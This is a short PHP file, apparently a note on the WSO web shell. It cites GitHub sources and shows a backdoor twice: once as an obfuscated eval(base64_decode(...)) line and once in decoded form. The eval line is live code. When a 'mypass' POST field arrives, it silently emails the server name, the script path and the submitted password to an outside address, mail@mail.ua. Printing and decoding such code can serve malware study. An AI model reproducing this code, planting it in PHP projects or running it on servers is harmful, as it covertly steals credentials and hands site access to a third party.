<?php
/**
* WSO.php
* Source: https://github.com/wso-shell/WSO/blob/master/WSO.php
 *        https://github.com/wso-shell/PHP-SHELL-WSO/blob/master/WSO.php
* Receiver: mail@mail.ua
**/
//Obfubuscated:
eval(base64_decode("aWYoYXJyYXlfa2V5X2V4aXN0cygnbXlwYXNzJywkX1BPU1QpKXsgJHRtcCA9ICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydQSFBfU0VMRiddLiJcbiIuJF9QT1NUWydwYXNzJ107IEBtYWlsKCdtYWlsQG1haWwudWEnLCAnbWFpbCcsICR0bXApOyB9"));
//Deobfubuscated:
if(array_key_exists('mypass',$_POST)){
  $tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass'];
  @mail('mail@mail.ua', 'mail', $tmp);
}
